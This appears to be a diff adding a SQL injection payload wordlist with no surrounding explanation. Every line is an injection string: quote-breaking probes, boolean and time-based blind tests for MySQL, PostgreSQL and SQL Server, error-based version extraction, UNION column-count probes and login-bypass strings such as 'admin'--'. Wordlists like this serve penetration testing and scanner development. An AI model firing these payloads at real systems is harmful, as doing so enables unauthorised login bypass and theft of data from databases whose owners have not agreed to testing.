@@ -1,0 +1,45 @@
+'
+''
+`
+')
+'))
+'))
+'--
+'#
+'/*
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(5)--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+' OR SLEEP(5)--
+';SELECT PG_SLEEP(5)--
+';SELECT 1 FROM PG_SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
+1' AND 1=1--
+1' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+1 AND SLEEP(5)
+1 OR 1=1
+1 OR 1=2
+1) AND 1=1--
+1)) AND 1=1--
+1 AND 1=1--
+1" AND 1=1--
+1' AND '1'='1
+1' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' OR 1=1 LIMIT 1--
+admin'--
+admin'#
+admin'/*
